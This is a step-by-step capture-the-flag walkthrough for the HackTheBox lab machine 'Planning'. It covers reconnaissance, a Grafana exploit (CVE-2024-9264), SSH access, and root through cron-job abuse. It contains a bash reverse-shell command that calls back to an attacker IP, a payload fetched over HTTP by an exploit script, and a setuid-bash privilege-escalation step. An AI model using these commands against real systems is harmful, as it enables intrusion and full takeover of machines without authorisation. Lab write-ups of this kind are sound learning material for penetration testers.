This is a detailed, step-by-step Markdown walkthrough for the HackTheBox machine **Planning**, guiding users through the full exploitation process — from initial reconnaissance to root access.

This guide is ideal for penetration testers or HTB enthusiasts who want a structured learning approach, combining enumeration, exploitation (Grafana CVE-2024–9264), SSH access, port forwarding, and privilege escalation using cron jobs.

---

## 1. Preparation & Scanning

### 1.1. Connect to HTB VPN
```bash
sudo openvpn --config <your_htb_file.ovpn>
```

### 1.2. Add Hosts File Entries
```bash
echo "10.129.176.246 planning.htb" | sudo tee -a /etc/hosts
```

### 1.3. Nmap Scan
```bash
nmap -Pn -p- --min-rate 2000 -sC -sV -oN nmap-scan.txt 10.129.176.246
```
**Expected Result:** Ports 22 (SSH) and 80 (HTTP) are open.

---

## 2. Initial Enumeration

### 2.1. Web Recon
Visit `http://planning.htb` in your browser. If nothing appears, brute-force directories:
```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://planning.htb/FUZZ -fs <size>
```
**Key Find:** `grafana.planning.htb` subdomain

### 2.2. Update Hosts File
```bash
echo "10.129.176.246 grafana.planning.htb" | sudo tee -a /etc/hosts
```

### 2.3. Enumerate Grafana
Visit `http://grafana.planning.htb/`. Default login prompt appears.

---

## 3. Exploiting Grafana

### 3.1. Login with Default Credentials
```text
Username: admin
Password: 0D5oT70Fq13EvB5r
```

### 3.2. Grafana Exploitation (CVE-2024–9264)
Confirm version (e.g., 11.0.0). Use public exploit for arbitrary file read/RCE.

### 3.3. Prepare Reverse Shell Payload
```bash
echo 'bash -i >& /dev/tcp/<YOUR_IP>/1337 0>&1' > rev.sh
python3 -m http.server 8000
```

### 3.4. Set Up Listener
```bash
nc -lvnp 1337
```

### 3.5. Trigger Exploit
```bash
python3 exploit.py --url http://grafana.planning.htb --payload http://<YOUR_IP>:8000/rev.sh
```
**Result:** Reverse shell inside Grafana container

---

## 4. Privilege Escalation to User

### 4.1. Enumerate Env Vars in Container
```bash
env
```
Look for Enzo's credentials

### 4.2. SSH as Enzo
```bash
ssh enzo@planning.htb
# Password: <from environment>
```

### 4.3. Grab User Flag
```bash
cat /home/enzo/user.txt
```

---

## 5. Lateral Movement: CronJobs Dashboard

### 5.1. Port Forwarding to Internal App
```bash
ssh -L 8000:localhost:8000 enzo@planning.htb
```
Then visit: `http://127.0.0.1:8000`

### 5.2. Login to Cron Dashboard
Use discovered credentials

---

## 6. Gaining Root via CronJob Abuse

### 6.1. Create Malicious Cron Job
```bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
```

### 6.2. Trigger Root Shell
```bash
/tmp/rootbash -p
whoami
# root
```

### 6.3. Capture Root Flag
```bash
cat /root/root.txt
```

---

## Key Takeaways

- Enumeration is critical: web, environment, SMB, SSH, etc.
- Grafana misconfiguration & RCE via CVE-2024–9264 was the entry point.
- CronJob misconfig leveraged for root privilege escalation.
